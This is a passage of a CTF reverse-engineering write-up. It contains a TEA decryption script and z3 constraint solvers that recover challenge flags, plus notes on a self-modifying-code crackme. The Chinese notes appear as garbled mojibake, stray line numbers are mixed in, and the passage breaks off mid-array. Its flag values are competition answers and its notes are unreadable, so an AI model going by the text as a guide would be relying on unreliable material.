^ (k[2] + 16 * v0) v1 = v1&amp;0xffffffff v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1) v0 = v0&amp;0xffffffff sum = j[31-i] v0 ^= d38 v1 ^= d3c v[0] = v0&amp;0xffffffff v[1] = v1&amp;0xffffffffenc = [0x5E27B530, 0x0BDBEF7F3, 0x0E3516A8F, 0x5D836CFE, 0x0D83DFA09, 0x8EFC737A,0x55A853A3, 0x7A564EC5]k = [0x67452301, 0x0EFCDAB89, 0x98BADCFE, 0x10325476]m = [None]*2flag = []dword_41F038 = [0x1234567,0x5E27B530,0x0E3516A8F,0x0D83DFA09]dword_41F03C = [0x89ABCDEF,0x0BDBEF7F3,0x5D836CFE,0x8EFC737A]dword_41F000 = 0x9E3779B1for i in range(4): m[0] = enc[2*i] m[1] = enc[2*i+1] tea(m,k,dword_41F038[i],dword_41F03C[i]) flag.append(long_to_bytes(m[0])[::-1]) flag.append(long_to_bytes(m[1])[::-1])b&#x27;&#x27;.join(flag)#600d_y0u_r34lly_kn0w_734_4nd_53h babysmc1. smcå‡½æ•°ï¼Œä½†æ˜¯å¼‚æˆ–å€¼æ˜¯è¾“å…¥çš„å€¼2. å…¶ä»–ä¹Ÿæ²¡æœ‰å’Œè¾“å…¥å€¼ç›¸å…³çš„å‡½æ•°ï¼Œæ‰€ä»¥åªèƒ½é€‰æ‹©çˆ†ç ´3. å½“çˆ†ç ´åˆ°ç¬¬ä¸€ä¸ªæ“ä½œæ—¶push ebpæ—¶é‚£å°±æˆåŠŸäº†ï¼Œæ‰€ä»¥ç¡¬ç¼–ç å°±ä¸º0x55ï¼Œå…ˆæ˜¯loc50ï¼Œç¬¬ä¸€ä¸ªå€¼æ˜¯574. ä½†æ˜¯çˆ†ç ´å¤±è´¥ï¼ŒçœŸçš„æ˜¯ç³Ÿç³•ï¼ï¼ï¼5. åé¢å‘ç°è¿˜æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å±…ç„¶çˆ†ç ´æˆåŠŸäº†ï¼Œå¥‡äº†ä¸ªæ€ª6. åé¢æƒŠå¥‡åœ°å‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°åº”è¯¥è¢«å¼‚æˆ–äº†ä¸¤æ¬¡ï¼Œè¿›è¿‡256é•¿åº¦çš„è®¡ç®—ï¼Œç¡®å®å¦‚æ­¤7. ç„¶åå°±çˆ†ç ´å‡ºæ¥äº†ï¼Œyesï¼Œç”¨idcæ”¹ç¼–ç 8. æ”¹å®Œä¹‹åä»ä¿®æ”¹å¼€å§‹å¤„åˆ°returnä»£ç å…¨éƒ¨é‡æ–°åˆ†æä¸€éï¼Œå› ä¸º256é•¿åº¦æŠŠå·²ç»åˆ†æäº†çš„ä»£ç ä¹Ÿæ”¹äº†ï¼Œç„¶åé‡æ–°ç”Ÿæˆå‡½æ•°9. ç„¶åé€»è¾‘å°±æ˜¯å¾ªç¯åæ¬¡ï¼Œä¸åŒå‡½æ•°è°ƒç”¨åæ¬¡ï¼Œæœ€åç”¨z3è§£è¿™é‡Œé™„ä¸Šä»£ç ï¼Œä»…ä¾›å‚è€ƒ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656from z3 import *dword_422040 = [0x00027FC8, 0x00029049, 0x0003336C, 0x0002C6A7, 0x00036CB0, 0x0001F2BB, 0x00035262, 0x0002AEDF, 0x0002955E, 0x0002EE10, 0x0002B057, 0x0002FDE8, 0x00029B92, 0x00035842, 0x000294D2, 0x0002B984]flag = [0] * 34s = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(17,33)]s.add(dword_422040[0] == (159 * a1[8] \\ + 109 * a1[12] \\ + 14 * a1[0] \\ + 92 * a1[14] \\ + 211 * a1[4] \\ + 178 * a1[7] \\ + 57 * a1[2] \\ + 175 * a1[5] \\ + 170 * a1[11] \\ + 59 * a1[6] \\ + 200 * a1[9] \\ + 5 * a1[15] \\ + 48 * a1[13] \\ + 28 * a1[3] \\ + 18 * a1[10] \\ + 228 * a1[1])&amp;0xffffffff)s.add(dword_422040[6] == (173 * a1[11] \\ + 34 * a1[5] \\ + 69 * a1[4] \\ + 216 * a1[14] \\ + 225 * a1[9] \\ + 160 * a1[1] \\ + 207 * a1[10] \\ + 175 * a1[7] \\ + 121 * a1[0] \\ + 122 * a1[2] \\ + 179 * a1[12] \\ + 91 * a1[13] \\ + 181 * a1[8] \\ + 93 * a1[3] \\ + 121 * a1[6] \\ + 12 * a1[15])&amp;0xffffffff)s.add(dword_422040[8] == (215 * a1[11] \\ + 164 * a1[5] \\ + 97 * a1[2] \\ + 99 * a1[3] \\ + 188 * a1[4] \\ + ((a1[9] &lt;&lt; 7)&amp;0xffffffff) \\ + 214 * a1[6] \\ + 106 * a1[8] \\ + 169 * a1[0] \\ + 28 * a1[14] \\ + 18 * a1[12] \\ + a1[1] \\ + 177 * a1[10] \\ + 114 * a1[7] \\ + 176 * a1[15] \\ + 25 * a1[13])&amp;0xffffffff)s.add(dword_422040[9] == (175 * a1[14] \\ + 42 * a1[4] \\ + 214 * a1[12] \\ + 43 * a1[13] \\ + 147 * a1[6] \\ + 53 * a1[10] \\ + 12 * a1[1] \\ + 213 * a1[7] \\ + 241 * a1[9] \\ + 223 * a1[5] \\ + 65 * a1[3] \\ + 42 * a1[15] \\ + 131 * a1[2] \\ + 81 * a1[0] \\ + 92 * a1[11] \\ + 110 * a1[8])&amp;0xffffffff)s.add(dword_422040[13] == (57 * a1[0] \\ + 109 * a1[7] \\ + 60 * a1[2] \\ + 228 * a1[13] \\ + 166 * a1[4] \\ + 236 * a1[9] \\ + 100 * a1[6] \\ + 179 * a1[11] \\ + 20 * a1[12] \\ + 45 * a1[8] \\ + 204 * a1[3] \\ + 182 * a1[14] \\ + 84 * a1[10] \\ + 170 * a1[15] \\ + 199 * a1[5] \\ + 138 * a1[1])&amp;0xffffffff)s.add(dword_422040[10] == (98 * a1[11] \\ + 122 * a1[9] \\ + 237 * a1[12] \\ + 117 * a1[0] \\ + 34 * a1[3] \\ + 168 * a1[8] \\ + 135 * a1[10] \\ + 119 * a1[6] \\ + 91 * a1[2] \\ + 161 * a1[15] \\ + 152 * a1[7] \\ + 186 * a1[4] \\ + 187 * a1[13] \\ + 72 * a1[14] \\ + 36 * a1[5] \\ + 171 * a1[1])&amp;0xffffffff)s.add(dword_422040[7] == (184 * a1[9] \\ + 112 * a1[0] \\ + 107 * a1[11] \\ + 170 * a1[13] \\ + 55 * a1[8] \\ + 85 * a1[14] \\ + 212 * a1[10] \\ + 173 * a1[15] \\ + 166 * a1[12] \\ + 142 * a1[4] \\ + 202 * a1[5] \\ + 63 * a1[2] \\ + 30 * a1[7] \\ + 175 * a1[3] \\ + 217 * a1[6] \\ + 63 * a1[1])&amp;0xffffffff)s.add(dword_422040[15] == (((a1[7] &lt;&lt; 6)&amp;0xffffffff) \\ + 228 * a1[4] \\ + 90 * a1[11] \\ + 85 * a1[3] \\ + 196 * a1[6] \\ + 219 * a1[0] \\ + 93 * a1[14] \\ + 183 * a1[15] \\ + 156 * a1[12] \\ + 197 * a1[8] \\ + 119 * a1[13] \\ + 36 * a1[10] \\ + 205 * a1[2] \\ + 94 * a1[9] \\ + 153 * a1[5])&amp;0xffffffff)s.add(dword_422040[5] == (9 * a1[4] \\ + ((a1[5] &lt;&lt; 6)&amp;0xffffffff) \\ + 62 * a1[1] \\ + 58 * a1[7] \\ + 100 * a1[13] \\ + 137 * a1[11] \\ + 6 * a1[0] \\ + 119 * a1[9] \\ + 180 * a1[6] \\ + 228 * a1[8] \\ + 88 * a1[12] \\ + 107 * a1[15] \\ + 56 * a1[14] \\ + 207 * a1[2] \\ + 248 * a1[10] \\ + 150 * a1[3])&amp;0xffffffff)s.add(dword_422040[3] == (38 * a1[7] \\ + 194 * a1[4] \\ + 105 * a1[0] \\ + 150 * a1[6] \\ + 75 * a1[1] \\ + 89 * a1[15] \\ + 99 * a1[14] \\ + 98 * a1[3] \\ + 91 * a1[8] \\ + 178 * a1[12] \\ + 117 * a1[2] \\ + 48 * a1[13] \\ + 239 * a1[10] \\ + 233 * a1[11] \\ + 63 * a1[5] \\ + 250 * a1[9])&amp;0xffffffff)s.add(dword_422040[11] == (30 * a1[8] \\ + 13 * a1[5] \\ + 206 * a1[3] \\ + 234 * a1[15] \\ + 71 * a1[7] \\ + 239 * a1[12] \\ + 141 * a1[10] \\ + 179 * a1[13] \\ + 113 * a1[14] \\ + 181 * a1[9] \\ + 52 * a1[6] \\ + 74 * a1[11] \\ + 168 * a1[4] \\ + 239 * a1[1] \\ + 164 * a1[0] \\ + 179 * a1[2])&amp;0xffffffff)s.add(dword_422040[14] == (211 * a1[1] \\ + 74 * a1[5] \\ + 144 * a1[8] \\ + 234 * a1[0] \\ + 241 * a1[2] \\ + 157 * a1[11] \\ + 25 * a1[15] \\ + 6 * a1[10] \\ + 243 * a1[6] \\ + 107 * a1[9] \\ + 77 * a1[12] \\ + 127 * a1[4] \\ + 67 * a1[7] \\ + 13 * a1[14] \\ + 151 * a1[3] \\ + 127 * a1[13])&amp;0xffffffff)s.add(dword_422040[2] == (209 * a1[9] \\ + 110 * a1[7] \\ + 22 * a1[10] \\ + 102 * a1[11] \\ + 187 * a1[1] \\ + 58 * a1[8] \\ + 236 * a1[6] \\ + 146 * a1[13] \\ + 205 * a1[15] \\ + 63 * a1[2] \\ + 211 * a1[4] \\ + 152 * a1[3] \\ + 82 * a1[14] \\ + 14 * a1[5] \\ + 49 * a1[12] \\ + 251 * a1[0])&amp;0xffffffff)s.add(dword_422040[12] == (230 * a1[0] \\ + 27 * a1[3] \\ + 186 * a1[10] \\ + 58 * a1[7] \\ + 121 * a1[1] \\ + 59 * a1[14] \\ + 90 * a1[12] \\ + 40 * a1[2] \\ + 230 * a1[11] \\ + 25 * a1[6] \\ + 198 * a1[5] \\ + 81 * a1[4] \\ + 71 * a1[13] \\ + 180 * a1[8] \\ + 149 * a1[9] \\ + 73 * a1[15])&amp;0xffffffff)s.add(dword_422040[4] == (188 * a1[5] \\ + 80 * a1[1] \\ + 221 * a1[6] \\ + ((a1[12] &lt;&lt; 6)&amp;0xffffffff) \\ + 230 * a1[3] \\ + 123 * a1[8] \\ + 124 * a1[11] \\ + 253 * a1[0] \\ + 202 * a1[10] \\ + 63 * a1[2] \\ + 40 * a1[7] \\ + 109 * a1[9] \\ + 195 * a1[15] \\ + 199 * a1[13] \\ + 82 * a1[4] \\ + 225 * a1[14])&amp;0xffffffff)s.add(dword_422040[1] == (236 * a1[15] \\ + 44 * a1[14] \\ + 214 * a1[13] \\ + 52 * a1[8] \\ + 37 * a1[6] \\ + 101 * a1[9] \\ + 244 * a1[10] \\ + 238 * a1[11] \\ + 109 * a1[0] \\ + 188 * a1[1] \\ + 20 * a1[3] \\ + 87 * a1[7] \\ + 93 * a1[4] \\ + 158 * a1[5] \\ + 105 * a1[12] \\ + 3 * a1[2])&amp;0xffffffff)assert s.check() == satprint(s.model())flag[28] = 114flag[18] = 42flag[21] = 71flag[27] = 42flag[30] = 124flag[32] = 51flag[23] = 42flag[26] = 186flag[31] = 209flag[17] = 186flag[24] = 186flag[29] = 11flag[20] = 45flag[19] = 51flag[22] = 51flag[25] = 25dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]x = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(1,17)]x.add(dword_422000[12] == (199 * a1[9] \\ + 98 * a1[7] \\ + 192 * a1[8] \\ + 23 * a1[12] \\ + 79 * a1[14] \\ + 77 * a1[10] \\ + 185 * a1[13] \\ + 135 * a1[15] \\ + 119 * a1[4] \\ + 54 * a1[0] \\ + 41 * a1[1] \\ + 124 * a1[6] \\ + 18 * a1[2] \\ + 181 * a1[11] \\ + 191 * a1[5] \\ + 7 * a1[3])&amp;0xffffffff)x.add(dword_422000[3] == (210 * a1[11] \\ + 26 * a1[15] \\ + 169 * a1[0] \\ + 177 * a1[13] \\ + a1[6] \\ + 205 * a1[8] \\ + 223 * a1[10] \\ + 32 * a1[5] \\ + 225 * a1[3] \\ + 61 * a1[14] \\ + 72 * a1[1] \\ + 186 * a1[9] \\ + 253 * a1[12] \\ + 205 * a1[2] \\ + 49 * a1[4] \\ + 232 * a1[7])&amp;0xffffffff)x.add(dword_422000[13] == (192 * a1[3] \\ + 22 * a1[10] \\ + 175 * a1[1] \\ + 184 * a1[7] \\ + 116 * a1[15] \\ + 70 * a1[13] \\ + 153 * a1[14] \\ + 119 * a1[0] \\ + 217 * a1[6] \\ + 123 * a1[5] \\ + 17 * a1[2] \\ + 244 * a1[12] \\ + 116 * a1[8] \\ + 46 * a1[4] \\ + 19 * a1[9] \\ + 130 * a1[11])&amp;0xffffffff)x.add(dword_422000[7] == (41 * a1[12] \\ + 71 * a1[7] \\ + 185 * a1[1] \\ + 69 * a1[11] \\ + 142 * a1[8] \\ + 221 * a1[5] \\ + 24 * a1[3] \\ + 208 * a1[6] \\ + 41 * a1[9] \\ + 159 * a1[2] \\ + 231 * a1[14] \\ + 235 * a1[13] \\ + 225 * a1[0] \\ + (a1[4] &lt;&lt; 6) \\ + 162 * a1[10] \\ + 134 * a1[15])&amp;0xffffffff)x.add(dword_422000[11] == (36 * a1[12] \\ + 220 * a1[4] \\ + 110 * a1[13] \\ + 45 * a1[7] \\ + 123 * a1[9] \\ + 133 * a1[1] \\ + 101 * a1[5] \\ + 137 * a1[10] \\ + 102 * a1[0] \\ + 227 * a1[14] \\ + 94 * a1[15] \\ + 18 * a1[2] \\ + 22 * a1[6] \\ + 189 * a1[11] \\ + 218 * a1[8])&amp;0xffffffff)x.add(dword_422000[15] == (86 * a1[11] \\ + 31 * a1[9] \\ + 229 * a1[6] \\ + 27 * a1[3] \\ + 6 * a1[12] \\ + 13 * a1[10] \\ + 158 * a1[1] \\ + 89 * a1[7] \\ + 35 * a1[15] \\ + 126 * a1[8] \\ + 165 * a1[13] \\ + 220 * a1[0] \\ + 138 * a1[5] \\ + 100 * a1[4] \\ + 84 * a1[14] \\ + 175 * a1[2])&amp;0xffffffff)x.add(dword_422000[8] == (7 * a1[1] \\ + 28 * a1[8] \\ + 131 * a1[10] \\ + 6 * a1[6] \\ + 254 * a1[0] \\ + 130 * a1[13] \\ + 124 * a1[3] \\ + 55 * a1[12] \\ + 157 * a1[14] \\ + 175 * a1[5] \\ + 140 * a1[4] \\ + 241 * a1[9] \\ + 11 * a1[11] \\ + 211 * a1[2] \\ + 121 * a1[7] \\ + 200 * a1[15])&amp;0xffffffff)x.add(dword_422000[6] == (195 * a1[14] \\ + 197 * a1[13] \\ + 218 * a1[7] \\ + 83 * a1[1] \\ + 98 * a1[2] \\ + 70 * a1[10] \\ + 229 * a1[15] \\ + 148 * a1[11] \\ + 195 * a1[0] \\ + 94 * a1[6] \\ + 211 * a1[12] \\ + 220 * a1[9] \\ + 81 * a1[5] \\ + 253 * a1[8] \\ + 78 * a1[4] \\ + 4 * a1[3])&amp;0xffffffff)x.add(dword_422000[14] == (3 * a1[4] \\ + 136 * a1[7] \\ + 156 * a1[3] \\ + 189 * a1[1] \\ + 244 * a1[12] \\ + 157 * a1[15] \\ + 83 * a1[9] \\ + 6 * a1[0] \\ + 113 * a1[6] \\ + 63 * a1[14] \\ + 35 * a1[2] \\ + 22 * a1[8] \\ + 26 * a1[10] \\ + 62 * a1[11] \\ + 98 * a1[5] \\ + 110 * a1[13])&amp;0xffffffff)x.add(dword_422000[4] == (96 * a1[4] \\ + 248 * a1[8] \\ + 191 * a1[9] \\ + 194 * a1[2] \\ + 154 * a1[1] \\ + 31 * a1[6] \\ + 157 * a1[7] \\ + 248 * a1[13] \\ + 81 * a1[15] \\ + 56 * a1[10] \\ + 52 * a1[0] \\ + 94 * a1[12] \\ + 212 * a1[5] \\ + 83 * a1[3] \\ + 83 * a1[14] \\ + 158 * a1[11])&amp;0xffffffff)x.add(dword_422000[1] == (67 * a1[4] \\ + 220 * a1[2] \\ + 123 * a1[11] \\ + 168 * a1[5] \\ + 23 * a1[12] \\ + 148 * a1[7] \\ + 127 * a1[10] \\ + 194 * a1[1] \\ + 132 * a1[8] \\ + 44 * a1[0] \\ + 60 * a1[13] \\ + 98 * a1[15] \\ + 38 * a1[14] \\ + 245 * a1[9] \\ + 159 * a1[6] \\ + 146 * a1[3])&amp;0xffffffff)x.add(dword_422000[5] == (132 * a1[3] \\ + 10 * a1[7] \\ + 95 * a1[0] \\ + 83 * a1[10] \\ + 99 * a1[1] \\ + 77 * a1[12] \\ + 195 * a1[2] \\ + 47 * a1[6] \\ + 38 * a1[13] \\ + 178 * a1[8] \\ + 74 * a1[4] \\ + 86 * a1[11] \\ + 208 * a1[9] \\ + 240 * a1[14] \\ + 120 * a1[5] \\ + 43 * a1[15])&amp;0xffffffff)x.add(dword_422000[9] == (172 * a1[1] \\ + 110 * a1[2] \\ + 92 * a1[7] \\ + 126 * a1[15] \\ + 91 * a1[0] \\ + 77 * a1[6] \\ + 207 * a1[5] \\ + 249 * a1[11] \\ + 240 * a1[12] \\ + 129 * a1[10] \\ + 6 * a1[13] \\ + 100 * a1[3] \\ + a1[14] \\ + 76 * a1[9] \\ + 127 * a1[4] \\ + 4 * a1[8])&amp;0xffffffff)x.add(dword_422000[10] == (46 * a1[15] \\ + 37 * a1[0] \\ + 3 * a1[3] \\ + 72 * a1[6] \\ + 116 * a1[7] \\ + 186 * a1[1] \\ + 221 * a1[14] \\ + 236 * a1[4] \\ + 79 * a1[2] \\ + 175 * a1[10] \\ + 184 * a1[9] \\ + 160 * a1[11] \\ + 227 * a1[12] \\ + 99 * a1[8] \\ + 71 * a1[13] \\ + 4 * a1[5])&amp;0xffffffff)x.add(dword_422000[0] == (203 * a1[3] \\ + 31 * a1[0] \\ + 11 * a1[14] \\ + 149 * a1[7] \\ + 215 * a1[5] \\ + 206 * a1[1] \\ + 245 * a1[6] \\ + 9 * a1[11] \\ + 16 * a1[10] \\ + 241 * a1[13] \\ + 110 * a1[8] \\ + 175 * a1[2] \\ + 38 * a1[4] \\ + 227 * a1[9] \\ + 208 * a1[12] \\ + 8 * a1[15])&amp;0xffffffff)x.add(dword_422000[2] == (132 * a1[3] \\ + 119 * a1[14] \\ + 26 * a1[8] \\ + 24 * a1[6] \\ + 121 * a1[11] \\ + 235 * a1[2] \\ + 228 * a1[12] \\ + 34 * a1[5] \\ + 37 * a1[15] \\ + 24 * a1[9] \\ + 145 * a1[13] \\ + 199 * a1[4] \\ + 173 * a1[10] \\ + 58 * a1[0] \\ + 246 * a1[7] \\ + 199 * a1[1])&amp;0xffffffff) assert x.check() == satprint(x.model())flag[0] = 0x23flag[33] = 0x21flag[5] = 43flag[11] = 186flag[8] = 51flag[16] = 72flag[6] = 42flag[4] = 51flag[3] = 1flag[10] = 179flag[14] = 43flag[7] = 186flag[1] = 90flag[13] = 113flag[12] = 51flag[2] = 45flag[9] = 72flag[15] = 114by280 = [0x7A, 0x91, 0x9F, 0x23, 0x71, 0xD1, 0x63, 0xDB, 0x59, 0x0A, 0xEC, 0x69, 0xEE, 0x76, 0x5D, 0x64, 0x37, 0x42, 0x8C, 0x0B, 0x3C, 0x5C, 0x80, 0xAD, 0x6A, 0x03, 0x43, 0x93, 0xBC, 0xBF, 0xE3, 0xAF, 0x5A, 0x8A, 0x65, 0x0D, 0x31, 0xDF, 0x3E, 0xA7, 0xE4, 0xDD, 0xB4, 0xB0, 0x56, 0x1C, 0x12, 0xA4, 0x9E, 0xD8, 0x3D, 0x81, 0x60, 0x9A, 0xCB, 0xFA, 0xB1, 0xE0, 0xD3, 0xF4, 0xA2, 0x26, 0x68, 0x90, 0x4B, 0x45, 0x85, 0x20, 0x16, 0xDE, 0xED, 0x4C, 0x6F, 0x34, 0xDC, 0xBE, 0xD2, 0x46, 0x33, 0x14, 0x77, 0xC6, 0xCD, 0xF0, 0xC5, 0xAC, 0x1F, 0xD0, 0x95, 0x97, 0x3F, 0xD7, 0x52, 0xAE, 0xB9, 0xC9, 0x0C, 0xCA, 0x4E, 0xF1, 0xB7, 0x39, 0x7F, 0x27, 0x2B, 0x40, 0x4A, 0x51, 0xA1, 0xCC, 0xCE, 0x6E, 0x70, 0xFF, 0x0E, 0xEF, 0x8E, 0x25, 0xB3, 0x5E, 0x6C, 0xAB, 0x02, 0x49, 0xE9, 0x9B, 0x36, 0x13, 0x9C, 0x04, 0x35, 0xC0, 0xFB, 0x3A, 0x67, 0xB6, 0x9D, 0xC2, 0x73, 0xB5, 0x6D, 0xCF, 0x83, 0x2C, 0x01, 0xC1, 0x10, 0x6B, 0x79, 0x87, 0x5B, 0x57, 0x47, 0xE5, 0x15, 0xF7, 0xA5, 0x74, 0xAA, 0x53, 0x7D, 0x2E, 0xD5, 0xA3, 0x19, 0xF5, 0x2D, 0xFD, 0x61, 0x8D, 0xC8, 0x1B, 0xC3, 0xDA, 0xF6, 0x72, 0x54, 0x5F, 0x1E, 0xE8, 0x17, 0x50, 0xB2, 0xE7, 0x0F, 0x7E, 0x55, 0xBD, 0x86, 0x00, 0x78, 0x94, 0x92, 0x09, 0x2F, 0xD6, 0xD9, 0xF3, 0x29, 0xE6, 0x24, 0x32, 0x66, 0x22, 0x41, 0xC4, 0x7C, 0x05, 0x98, 0x44, 0x4F, 0x99, 0xA9, 0xE1, 0x8F, 0x08, 0x1A, 0x2A, 0x11, 0xEA, 0x3B, 0xE2, 0x38, 0xB8, 0x18, 0xF9, 0xD4, 0xC7, 0x62, 0x7B, 0x75, 0x58, 0x96, 0x28, 0xEB, 0x06, 0x84, 0x89, 0x48, 0x82, 0x88, 0xA6, 0xFE, 0xA0, 0xF2, 0xF8, 0x1D, 0x8B, 0xFC, 0xA8, 0x21, 0x30, 0xBB, 0x07, 0xBA, 0x4D]by380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69, 0x8F, 0x0D, 0x31, 0x0C, 0xB0, 0xF1, 0x2E, 0x98, 0xC1, 0xC2, 0x96, 0xB2, 0xEB, 0xBF, 0xDF, 0x17, 0xF4, 0x7F, 0xE5, 0x66, 0x73, 0xD8, 0x56, 0x46, 0x20, 0x9C, 0x77, 0x3D, 0x72, 0xA3, 0x91, 0x49, 0x68, 0x4C, 0x1E, 0xAE, 0x06, 0x7A, 0x94, 0xDD, 0x52, 0x55, 0x2C, 0xB8, 0x42, 0x79, 0xFE, 0x38, 0xEF, 0x8B, 0xF7, 0xAC, 0xDC, 0xFF, 0x78, 0x34, 0x70, 0xA9, 0xCE, 0x3F, 0x0E, 0x11, 0x43, 0x5B, 0xF8, 0xAF, 0xD0, 0xFA, 0x33, 0xBA, 0xCF, 0x4A, 0xC9, 0x88, 0x4E, 0x80, 0x10, 0x85, 0x37, 0x12, 0xAB, 0xE1, 0x61, 0xB7, 0x3E, 0x4D, 0x19, 0x3A, 0x04, 0x8C, 0x92, 0x0B, 0xE7, 0x3C, 0xEA, 0xC7, 0x16, 0x35, 0xB1, 0xA7, 0x8E, 0x40, 0x9F, 0xB6, 0xB5, 0x25, 0xA0, 0x5A, 0x30, 0x7D, 0xA2, 0x1A, 0x64, 0xC5, 0x6D, 0x74, 0x82, 0x08, 0x7E, 0xD2, 0xF6, 0xAA, 0xDA, 0xED, 0x4B, 0x6E, 0xE8, 0xE9, 0xE2, 0xD4, 0x71, 0xB9, 0x09, 0x84, 0x3B, 0xC4, 0x1C, 0x60, 0xFD, 0x22, 0x99, 0x39, 0x97, 0x18, 0x89, 0x7C, 0xA4, 0x27, 0xBD, 0x0F, 0xCC, 0x95, 0xF5, 0xB3, 0x65, 0x6B, 0x8A, 0x58, 0x36, 0xBB, 0x9E, 0x75, 0xD1, 0x03, 0x9D, 0x6A, 0x6C, 0x53, 0x05, 0xB4, 0xE4, 0xEE, 0x67, 0x87, 0x7B, 0x32, 0x2D, 0x24, 0x2A, 0x59, 0xEC, 0x0A, 0xDB, 0x21, 0x07, 0x23, 0x50, 0x02, 0x41, 0xF2, 0x83, 0xD9, 0x26, 0xBC, 0x6F, 0x86, 0xA6, 0x93, 0xF9, 0xC8, 0xD6, 0xA5, 0x1D, 0xE3, 0xE0, 0xFC, 0xCA, 0x1B, 0x5E, 0x8D, 0x2F, 0x5C, 0xBE, 0x47, 0xA8, 0x44, 0x57, 0x54, 0x48, 0xC3, 0x00, 0x62, 0x5D, 0xCB, 0xD7, 0x76, 0xCD, 0x28, 0xD5, 0x14, 0x90, 0x13, 0xDE, 0x5F, 0xF0, 0x01, 0x2B, 0xC6, 0x29, 0x9A, 0x9B, 0x51, 0xF3, 0xFB, 0xA1]by580 = [0x00, 0x74, 0x59, 0xC6, 0xAC, 0xD3, 0xC1, 0xA0, 0x88, 0x3F, 0x1C, 0x28, 0x17, 0x22, 0xC5, 0x38, 0xF9, 0x1B, 0x21, 0x49, 0x99, 0xAF, 0xD6, 0x95, 0xA4, 0x9D, 0x5D, 0x5B, 0x73, 0xFE, 0xC9, 0x9A, 0x4C, 0xB4, 0x27, 0x5E, 0x71, 0x25, 0xE2, 0x90, 0xC0, 0x62, 0x5F, 0x48, 0x77, 0xE0, 0xF2, 0x8E, 0x40, 0xC7, 0x79, 0x1A, 0xDC, 0xF3, 0x01, 0xB6, 0xD8, 0xB5, 0x67, 0x1E, 0x85, 0x12, 0x68, 0x87, 0xD0, 0x30, 0xEB, 0x2F, 0x50, 0xCF, 0xEE, 0xDD, 0xFB, 0xE6, 0xA5, 0x69, 0x05, 0x75, 0xB7, 0xEF, 0x70, 0x53, 0xFF, 0xBA, 0x80, 0x41, 0x9B, 0xA1, 0x39, 0xF8, 0x65, 0x1F, 0x7A, 0x51, 0x98, 0xAD, 0x02, 0x13, 0x18, 0xC3, 0x31, 0x89, 0xCD, 0xCA, 0x91, 0xD1, 0x78, 0x57, 0x47, 0xB8, 0x54, 0x9F, 0x96, 0x04, 0x23, 0x2B, 0xE5, 0x46, 0x29, 0x7C, 0x76, 0x82, 0xBC, 0xFC, 0x6E, 0xEC, 0xED, 0x64, 0x4A, 0x26, 0x34, 0x5C, 0x19, 0x55, 0xFD, 0x6D, 0xFA, 0x7E, 0xB2, 0xD4, 0xF1, 0xF6, 0xE4, 0x60, 0xB0, 0x52, 0x9E, 0x8F, 0xBB, 0x08, 0x3B, 0x97, 0xE8, 0x10, 0x6C, 0x44, 0x3A, 0x36, 0x35, 0x03, 0xC4, 0x81, 0x9C, 0xAB, 0xCB, 0x66, 0xAA, 0x37, 0xA2, 0xD2, 0xE1, 0xE9, 0x7B, 0x14, 0x8D, 0xD9, 0xF5, 0x0B, 0xC2, 0x07, 0xA8, 0x0D, 0xA3, 0x0A, 0x84, 0x6B, 0x2C, 0xEA, 0x0C, 0xAE, 0x7D, 0x6F, 0xD7, 0xE7, 0xC8, 0x3C, 0x45, 0xCC, 0x58, 0xB9, 0x3D, 0x33, 0x4E, 0x4B, 0x8C, 0xCE, 0x72, 0x6A, 0x8B, 0x2D, 0x24, 0x11, 0xDF, 0x5A, 0x2E, 0x92, 0xDA, 0x86, 0x94, 0xA7, 0xD5, 0x4F, 0x2A, 0xB3, 0x63, 0x61, 0xE3, 0xDE, 0x43, 0x1D, 0xBF, 0x15, 0x32, 0xBE, 0x16, 0x3E, 0x93, 0x7F, 0x83, 0x56, 0x06, 0xF7, 0x8A, 0x20, 0xBD, 0x0E, 0xA6, 0xDB, 0x0F, 0xB1, 0x42, 0xF0, 0x09, 0x4D, 0xA9, 0xF4]by780 = [0x0F, 0xA5, 0xBA, 0x03, 0xF9, 0x69, 0x2A, 0xD7, 0xEA, 0xB5, 0xFC, 0xA1, 0x39, 0x20, 0x68, 0x72, 0x25, 0xB2, 0x6C, 0xAD, 0x88, 0x51, 0x73, 0xEB, 0xCF, 0x13, 0xDE, 0x7C, 0x6D, 0x38, 0x05, 0x09, 0xC2, 0x96, 0x1F, 0x7F, 0x37, 0x4A, 0xC9, 0xE7, 0x6A, 0xB0, 0x59, 0xF7, 0xD2, 0xB9, 0x16, 0xC8, 0xEE, 0xA9, 0x18, 0x80, 0xAC, 0xE3, 0x9E, 0x6F, 0x3C, 0x2F, 0x3E, 0x9A, 0xBE, 0x1D, 0xB4, 0x7B, 0x7D, 0x32, 0x6B, 0x74, 0xC5, 